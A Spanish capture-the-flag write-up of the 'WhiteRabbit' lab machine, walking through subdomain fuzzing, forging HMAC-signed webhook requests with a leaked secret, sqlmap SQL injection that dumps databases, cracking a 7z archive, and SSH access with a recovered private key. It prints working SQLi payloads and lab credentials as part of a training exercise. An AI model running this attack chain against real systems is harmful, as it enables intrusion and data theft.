### 1. Enumeración inicial

Hacemos un escaneo completo de puertos:

```bash
sudo nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.63 -oG allPorts
[sudo] contraseña para abra: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-20 17:08 +0000
Initiating SYN Stealth Scan at 17:08
Scanning 10.10.11.63 [65535 ports]
Discovered open port 22/tcp on 10.10.11.63
Discovered open port 80/tcp on 10.10.11.63
Discovered open port 2222/tcp on 10.10.11.63
Completed SYN Stealth Scan at 17:08, 14.74s elapsed (65535 total ports)
Nmap scan report for 10.10.11.63
Host is up, received user-set (0.073s latency).
Scanned at 2025-11-20 17:08:23 WET for 14s
Not shown: 57596 closed tcp ports (reset), 7936 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack ttl 63
80/tcp   open  http         syn-ack ttl 62
2222/tcp open  EtherNetIP-1 syn-ack ttl 62

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.83 seconds
           Raw packets sent: 75430 (3.319MB) | Rcvd: 58057 (2.322MB)
```

Tenemos 2 SSHs abiertos en principio.

```bash
sudo nmap -sCV -p22,80,2222 10.10.11.63
Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-20 17:09 +0000
Nmap scan report for 10.10.11.63
Host is up (0.070s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0f:b0:5e:9f:85:81:c6:ce:fa:f4:97:c2:99:c5:db:b3 (ECDSA)
|_  256 a9:19:c3:55:fe:6a:9a:1b:83:8f:9d:21:0a:08:95:47 (ED25519)
80/tcp   open  http    Caddy httpd
|_http-server-header: Caddy
|_http-title: Did not follow redirect to http://whiterabbit.htb
2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 c8:28:4c:7a:6f:25:7b:58:76:65:d8:2e:d1:eb:4a:26 (ECDSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.14 seconds
```

Huele a contenedores, tenemos dos versiones diferentes de SSH.

---

### 2. Enumeración web — Subdominios

Añadimos al /etc/hosts whiterabbit.htb. Es una página sin mucho contenido, toca tirar de fuzzing.

Fuzzing de Subdominios:

```bash
ffuf -w /home/abra/Documentos/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u 'http://whiterabbit.htb' -H "Host: FUZZ.whiterabbit.htb" -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://whiterabbit.htb
 :: Wordlist         : FUZZ: /home/abra/Documentos/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.whiterabbit.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

status                  [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 73ms]
:: Progress: [19966/19966] :: Job [1/1] :: 193 req/sec :: Duration: [0:00:50] :: Errors: 0 ::
```

Hay un subdominio status.whiterabbit.htb, lo añadimos al /etc/hosts y miramos la página a ver que nos encontramos. Es un panel de autenticación de la aplicación **Uptime Kuma**. Todas sus vulnerabilidades son authenticated por lo que no me sirve de nada por el momento.

Vamos a ver si encontramos rutas, en principio nada. **Esta máquina es muy rebuscada pero me gusta**, tenemos que mandarle un escaneo muy especifico para encontrar falsos códigos 404:

```bash
ffuf -w /home/abra/Documentos/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://status.whiterabbit.htb/FUZZ -mc 404 3aeb791c1f3df5bdfefa4b9fc2f89652-fr "Not Found|404"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://status.whiterabbit.htb/FUZZ
 :: Wordlist         : FUZZ: /home/abra/Documentos/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 404
 :: Filter           : Regexp: Not Found|404
________________________________________________

status                  [Status: 404, Size: 2444, Words: 247, Lines: 39, Duration: 92ms]
Status                  [Status: 404, Size: 2444, Words: 247, Lines: 39, Duration: 85ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Hay un recurso status que está en blanco, pero ahora a este mismo le podemos mandar un escaneo de subdirectorios normal:

```bash
ffuf -w /home/abra/Documentos/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://status.whiterabbit.htb/status/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://status.whiterabbit.htb/status/FUZZ
 :: Wordlist         : FUZZ: /home/abra/Documentos/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

temp                    [Status: 200, Size: 3359, Words: 304, Lines: 41, Duration: 104ms]
```

Hemos descubierto una nueva ruta, **/temp**

---

### 3. Enumeración de subdominios adicionales

Accedemos a http://status.whiterabbit.htb/status/temp.

Hay varios subdominios listados en la página que podemos añadir al /etc/hosts:

`a668910b5514e.whiterabbit.htb` `ddb09a8558c9.whiterabbit.htb`

También hay algo de `n8n [Production]` que a saber para que sirve.

http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks

Este recurso tiene una petición por post a otro recurso relacionado con **n8n** de un nuevo subdominio a añadir: `28efa8f7df.whiterabbit.htb`. La página nos muestra como se le deben mandar las peticiones:

```bash
 curl -X POST "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \
  -H "x-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd" \
  -H "Content-Type: application/json" \
  -d '{ "campaign_id": 1, "email": "test@ex.com", "message": "Clicked Link" }'

Info: User is not in database%          
```

Vale, en un principio la firma parece válida, pero si le mando una petición intentando cambiar algún dato o hacer SQLi me manda:

```bash
curl -X POST "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \
  -H "x-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd" \
  -H "Content-Type: application/json" \
  -d '{ "campaign_id": 1, "email": "test@ex.com; DROP TABLE users--", "message": "Clicked Link" }'

Error: Provided signature is not valid%   
```

---

### 4. Descubrimiento de secreto HMAC y SQLi

Hay un archivo **gophish_to_phishing_score_database.json** en el mismo recurso http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks que contiene el secreto HMAC usado para firmar las peticiones. Con esto podemos generar firmas válidas para cualquier payload.

```bash
"secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
```

Usando la IA podemos crear con Python un proxy local que vaya firmando automáticamete las peticiones de sqlmap, así podemos probar SQLi:

```python
#!/usr/bin/env python3
import hmac
import hashlib
import json
import sys

SECRET = "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"

def generate_signed_payload(sql_payload):
    """
    Genera un payload JSON con firma válida para SQLMap
    """
    base_payload = {
        "campaign_id": 1,
        "email": sql_payload,
        "message": "Clicked Link"
    }
    
    # Generar firma
    signature = hmac.new(
        SECRET.encode('utf-8'),
        json.dumps(base_payload, separators=(',', ':')).encode('utf-8'),
        hashlib.sha256
    ).hexdigest()
    
    return base_payload, f"sha256={signature}"

if __name__ == "__main__":
    if len(sys.argv) > 1:
        payload = sys.argv[1]
        json_payload, signature = generate_signed_payload(payload)
        print(f"JSON: {json.dumps(json_payload)}")
        print(f"Signature: {signature}")
    else:
        # Ejemplo
        test_payload = "test' OR '1'='1"
        json_payload, signature = generate_signed_payload(test_payload)
        print(f"curl -X POST '{URL}' \\")
        print(f"  -H 'x-gophish-signature: {signature}' \\")
        print(f"  -H 'Content-Type: application/json' \\")
        print(f"  -d '{json.dumps(json_payload)}'")
```

Lo ejecutamos en una terminal, y en la otra:

```bash
sqlmap -u "http://localhost:8081" \
  --method=POST \
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  --headers="Content-Type: application/json" \
  --level=5 \
  --risk=3 \
  --batch \
  --dbs
```

Resultado:

```bash
sqlmap -u "http://localhost:8081" --method=POST --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' --headers="Content-Type: application/json" --level=5 --risk=3 --batch -t 100 --dbs
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.4#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual con❯ sqlmap -u "http://localhost:8081" --method=POST --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' --headers="Content-Type: application/json" --level=5 --risk=3 --batch --dbs
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:58:14 /2025-11-20/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[18:58:14] [INFO] testing connection to the target URL
[18:58:15] [WARNING] turning off pre-connect mechanism because of incompatible server ('BaseHTTP/0.6 Python/3.13.7')
[18:58:15] [INFO] testing if the target URL content is stable
[18:58:15] [INFO] target URL content is stable
[18:58:15] [INFO] testing if (custom) POST parameter 'JSON #1*' is dynamic
[18:58:16] [WARNING] (custom) POST parameter 'JSON #1*' does not appear to be dynamic
[18:58:16] [INFO] heuristic (basic) test shows that (custom) POST parameter 'JSON #1*' might be injectable (possible DBMS: 'MySQL')
[18:58:16] [INFO] testing for SQL injection on (custom) POST parameter 'JSON #1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[18:58:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:58:24] [WARNING] reflective value(s) found and filtering out
[18:58:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:59:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:59:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:59:27] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[18:59:27] [INFO] testing 'Generic inline queries'
[18:59:27] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[18:59:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[18:59:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[18:59:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[18:59:28] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[18:59:28] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[18:59:29] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[18:59:29] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[18:59:29] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:59:29] [INFO] (custom) POST parameter 'JSON #1*' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[18:59:29] [INFO] testing 'MySQL inline queries'
[18:59:30] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[18:59:42] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[18:59:42] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:59:53] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[18:59:53] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:59:53] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:59:54] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:59:55] [INFO] target URL appears to have 2 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[18:59:58] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[19:00:05] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[19:00:09] [INFO] testing 'Generic UNION query (42) - 21 to 40 columns'
[19:00:50] [INFO] testing 'Generic UNION query (42) - 41 to 60 columns'
[19:00:54] [INFO] testing 'Generic UNION query (42) - 61 to 80 columns'
[19:00:58] [INFO] testing 'Generic UNION query (42) - 81 to 100 columns'
[19:02:25] [INFO] testing 'MySQL UNION query (42) - 1 to 20 columns'
[19:02:35] [INFO] testing 'MySQL UNION query (42) - 21 to 40 columns'
[19:02:39] [INFO] testing 'MySQL UNION query (42) - 41 to 60 columns'
[19:02:43] [INFO] testing 'MySQL UNION query (42) - 61 to 80 columns'
[19:02:48] [INFO] testing 'MySQL UNION query (42) - 81 to 100 columns'
(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1038 HTTP(s) requests:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: {"campaign_id":1,"email":"" AND 8922=(SELECT (CASE WHEN (8922=8922) THEN 8922 ELSE (SELECT 1008 UNION SELECT 8460) END))-- -","message":"Clicked Link"}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: {"campaign_id":1,"email":"" AND (SELECT 6304 FROM(SELECT COUNT(*),CONCAT(0x717a7a7871,(SELECT (ELT(6304=6304,1))),0x716a717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- iqBl","message":"Clicked Link"}

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: {"campaign_id":1,"email":"";SELECT SLEEP(5)#","message":"Clicked Link"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"campaign_id":1,"email":"" AND (SELECT 8916 FROM (SELECT(SLEEP(5)))IxEO)-- NcYg","message":"Clicked Link"}
---
[19:02:52] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[19:02:53] [INFO] fetching database names
[19:02:54] [INFO] retrieved: 'information_schema'
[19:02:54] [INFO] retrieved: 'phishing'
[19:02:54] [INFO] retrieved: 'temp'
available databases [3]:
[*] information_schema
[*] phishing
[*] temp

[19:02:54] [INFO] fetched data logged to text files under '/home/abra/.local/share/sqlmap/output/localhost'
[19:02:54] [WARNING] your sqlmap version is outdated

[*] ending @ 19:02:54 /2025-11-20/
```

Es vulnerable a SQLi, y tiene una base de datos pishing, vamos a sacarle la información:

Enumeramos las tablas:

```bash
sqlmap -u "http://localhost:8081" \
  --method=POST \
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  --headers="Content-Type: application/json" \
  -D phishing \
  --tables \
  --batch
  
  
+---------+
| victims |
+---------+
```

Vemos que columnas tiene la tabla victims:

```bash
sqlmap -u "http://localhost:8081" \
  --method=POST \
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  --headers="Content-Type: application/json" \
  -D phishing \
  -T victims \
  --columns \
  --batch
  
  
+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| email          | varchar(255) |
| phishing_score | int(11)      |
+----------------+--------------+
```

Dumpeamos los datos:

```bash
sqlmap -u "http://localhost:8081" \
  --method=POST \
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  --headers="Content-Type: application/json" \
  -D phishing \
  -T victims \
  --dump \
  --batch
  
Database: phishing
Table: victims
[30 entries]
+--------------------+----------------+
| email              | phishing_score |
+--------------------+----------------+
| test1@example.com  | 20             |
| test10@example.com | 100            |
| test11@example.com | 110            |
| test12@example.com | 120            |
| test13@example.com | 130            |
| test14@example.com | 140            |
| test15@example.com | 150            |
| test16@example.com | 160            |
| test17@example.com | 170            |
| test18@example.com | 180            |
| test19@example.com | 190            |
| test2@example.com  | 20             |
| test20@example.com | 200            |
| test21@example.com | 210            |
| test22@example.com | 220            |
| test23@example.com | 230            |
| test24@example.com | 240            |
| test25@example.com | 250            |
| test26@example.com | 260            |
| test27@example.com | 270            |
| test28@example.com | 280            |
| test29@example.com | 290            |
| test3@example.com  | 30             |
| test30@example.com | 300            |
| test4@example.com  | 40             |
| test5@example.com  | 50             |
| test6@example.com  | 8270           |
| test7@example.com  | 70             |
| test8@example.com  | 80             |
| test9@example.com  | 90             |
+--------------------+----------------+
```

Vale, no sabemos que hacer con esto por el momento. Vamos a enumerar la base de datos **temp** a ver que hay:

```bash
sqlmap -u "http://localhost:8081" \
  --method=POST \
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  --headers="Content-Type: application/json" \
  -D temp \
  --tables \
  --batch
  
  
+-------------+
| command_log |
+-------------+
```

Voy a dumpear el contenido de la tabla a ver:

```bash
sqlmap -u "http://localhost:8081" \
  --method=POST \
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  --headers="Content-Type: application/json" \
  -D temp \
  -T command_log \
  --dump \
  --batch
  
  
  +----+---------------------+------------------------------------------------------------------------------+
| id | date                | command                                                                      |
+----+---------------------+------------------------------------------------------------------------------+
| 1  | 2024-08-30 10:44:01 | uname -a                                                                     |
| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |
| 3  | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd                       |
| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                                         |
| 5  | 2024-08-30 11:59:47 | #thatwasclose                                                                |
| 6  | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |
+----+---------------------+------------------------------------------------------------------------------+
```

Se burlan de nosotros con ese "thatwasclose" y nos dan un nuevo subdominio a agregar: `75951e6ff.whiterabbit.htb`.

---

### 5. Acceso al repositorio Restic

Al tratar de acceder nos da un Method Not Allowed, si mandamos una petición por POST nos reporta un bad request. Si nos fijamos en la SQLi obtuvimos credenciales para Restic, una herramienta de backup.

URL: http://75951e6ff.whiterabbit.htb

Password: ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw

Comando usado: `restic init --repo rest:http://75951e6ff.whiterabbit.htb`

Vale, descargamos restic en nuestra máquina con `sudo pacman -S restic` y nos conectamos al restic por terminal, a ver que tiene:

```bash
export RESTIC_PASSWORD="ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw"


❯ restic -r rest:http://75951e6ff.whiterabbit.htb ls latest

repository 5b26a938 opened (version 2, compression level auto)
[0:00] 100.00%  5 / 5 index files loaded
snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit filtered by []:
/dev
/dev/shm
/dev/shm/bob
/dev/shm/bob/ssh
/dev/shm/bob/ssh/bob.7z


❯ restic -r rest:http://75951e6ff.whiterabbit.htb snapshots

repository 5b26a938 opened (version 2, compression level auto)
ID        Time                 Host         Tags        Paths
------------------------------------------------------------------------
272cacd5  2025-03-07 00:18:40  whiterabbit              /dev/shm/bob/ssh
------------------------------------------------------------------------
1 snapshots
```

Vamos a traer el archivo `bob.7z` descomprimido a nuestra máquina para leerlo:

```bash
restic -r rest:http://75951e6ff.whiterabbit.htb restore 272cacd5 --target /home/abra/htb_machines/WhiteRabbit

repository 5b26a938 opened (version 2, compression level auto)
[0:00] 100.00%  5 / 5 index files loaded
restoring snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit to /home/abra/htb_machines/WhiteRabbit
Summary: Restored 5 files/dirs (572 B) in 0:00
```

Tiene contraseña el archivo comprimido:

```bash
7z x bob.7z

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=es_ES.UTF-8 Threads:16 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 572 bytes (1 KiB)

Extracting archive: bob.7z
--
Path = bob.7z
Type = 7z
Physical Size = 572
Headers Size = 204
Method = LZMA2:12 7zAES
Solid = +
Blocks = 1

    
Enter password:
```

Tocará crackearla:

Extraemos el hash del fichero comprimido:

```bash
7z2john bob.7z > bob.7z.hash
```

Rompemos el hash:

```bash
john --wordlist=/home/abra/Documentos/rockyou.txt --fork=4 bob.7z.hash

Warning: detected hash type "7z", but the string is also recognized as "7z-opencl"
Use the "--format=7z-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 128/128 AVX 4x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 3 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Cost 4 (data length) is 365 for all loaded hashes
Will run 4 OpenMP threads per process (16 total across 4 processes)
Node numbers 1-4 of 4 (fork)
Note: Passwords longer than 28 rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
1q2w3e4r5t6y     (bob.7z)     
1 1g 0:00:03:59 DONE (2025-11-20 19:43) 0.004169g/s 24.88p/s 24.88c/s 24.88C/s 230891..1010101010
Waiting for 3 children to terminate
4 0g 0:00:03:59 DONE (2025-11-20 19:43) 0g/s 24.94p/s 24.94c/s 24.94C/s saraba..mike143
2 0g 0:00:04:00 DONE (2025-11-20 19:43) 0g/s 24.99p/s 24.99c/s 24.99C/s michael05..icarus
3 0g 0:00:04:00 DONE (2025-11-20 19:43) 0g/s 24.73p/s 24.73c/s 24.73C/s bearbear1..231990
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Tenemos la contraseña del archivo: `1q2w3e4r5t6y`.

```bash
7z x bob.7z

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=es_ES.UTF-8 Threads:16 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 572 bytes (1 KiB)

Extracting archive: bob.7z
--
Path = bob.7z
Type = 7z
Physical Size = 572
Headers Size = 204
Method = LZMA2:12 7zAES
Solid = +
Blocks = 1

    
Enter password:1q2w3e4r5t6y

Everything is Ok

Files: 3
Size:       557
Compressed: 572
```

Tenemos estos archivos descomprimidos:

```bash
❯ ls -l
total 12
-rw------- 1 abra abra 399 mar  7  2025 bob
-rw-r--r-- 1 abra abra  91 mar  7  2025 bob.pub
-rw-r--r-- 1 abra abra  67 mar  7  2025 config
❯ cat *
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4wAAAJAQ+wJXEPsC
VwAAAAtzc2gtZWQyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4w
AAAEBqLjKHrTqpjh/AqiRB07yEqcbH/uZA5qh8c0P72+kSNW8NNTJHAXhD4DaKbE4OdjyE
FMQae80HRLa9ouGYdkLjAAAACXJvb3RAbHVjeQECAwQ=
-----END OPENSSH PRIVATE KEY-----

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG8NNTJHAXhD4DaKbE4OdjyEFMQae80HRLa9ouGYdkLj root@lucy

Host whiterabbit
  HostName whiterabbit.htb
  Port 2222
  User bob
```

Tenemos un par de claves pub/privada y el username para el ssh que estaba expuesto por el puerto 2222.

---

### 6. Acceso al contenedor SSH (puerto 2222)

Vamos a entrar a ver, le pasamos al ssh la clave privada:

```
ssh bob@10.10.11.63 -p 2222 -i bob
The authenticity of host '[10.10.11.63]:2222 ([10.10.11.63]:2222)' can't be established.
ED25519 key fingerprint is: SHA256:jWKKPrkxU01KGLZeBG3gDZBIqKBFlfctuRcPBBG39sA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.11.63]:2222' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Nov 20 18:43:49 2025 from 10.10.14.226
bob@ebdce80611e9:~$ 
```

Todavía no tenemos flag, podemos suponer que como estamos en el puerto 2222 estamos dentro de un contenedor (también por el nombre de la máquina/IP interna).

```bash
bob@ebdce80611e9:~$ hostname -I
172.17.0.2 
```

```bash
bob@ebdce80611e9:~$ sudo -l
Matching Defaults entries for bob on ebdce80611e9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on ebdce80611e9:
    (ALL) NOPASSWD: /usr/bin/restic
```

Tenemos permisos de sudo para el binario /usr/bin/restic, vamos a ver si podemos salir del contenedor:

```bash
sudo /usr/bin/restic

restic is a backup program which allows saving multiple revisions of files and
directories in an encrypted repository stored on different backends.

The full documentation can be found at https://restic.readthedocs.io/ .

Usage:
  restic [command]

Available Commands:
  backup        Create a new backup of files and/or directories
  cache         Operate on local cache directories
  cat           Print internal objects to stdout
  check         Check the repository for errors
  copy          Copy snapshots from one repository to another
  diff          Show differences between two snapshots
  dump          Print a backed-up file to stdout
  find          Find a file, a directory or restic IDs
  forget        Remove snapshots from the repository
  generate      Generate manual pages and auto-completion files (bash, fish, zsh, powershell)
  help          Help about any command
  init          Initialize a new repository
  key           Manage keys (passwords)
  list          List objects in the repository
  ls            List files in a snapshot
  migrate       Apply migrations
  mount         Mount the repository
  prune         Remove unneeded data from the repository
  recover       Recover data from the repository not referenced by snapshots
  repair        Repair the repository
  restore       Extract the data from a snapshot
  rewrite       Rewrite snapshots to exclude unwanted files
  snapshots     List all snapshots
  stats         Scan the repository and show basic statistics
  tag           Modify tags on snapshots
  unlock        Remove locks other processes created
  version       Print version information

Flags:
      --cacert file                file to load root certificates from (default: use system certificates or $RESTIC_CACERT)
      --cache-dir directory        set the cache directory. (default: use system default cache directory)
      --cleanup-cache              auto remove old cache directories
      --compression mode           compression mode (only available for repository format version 2), one of (auto|off|max) (default: $RESTIC_COMPRESSION) (default auto)
  -h, --help                       help for restic
      --insecure-tls               skip TLS certificate verification when connecting to the repository (insecure)
      --json                       set output mode to JSON for commands that support it
      --key-hint key               key ID of key to try decrypting first (default: $RESTIC_KEY_HINT)
      --limit-download rate        limits downloads to a maximum rate in KiB/s. (default: unlimited)
      --limit-upload rate          limits uploads to a maximum rate in KiB/s. (default: unlimited)
      --no-cache                   do not use a local cache
      --no-extra-verify            skip additional verification of data before upload (see documentation)
      --no-lock                    do not lock the repository, this allows some operations on read-only repositories
  -o, --option key=value           set extended option (key=value, can be specified multiple times)
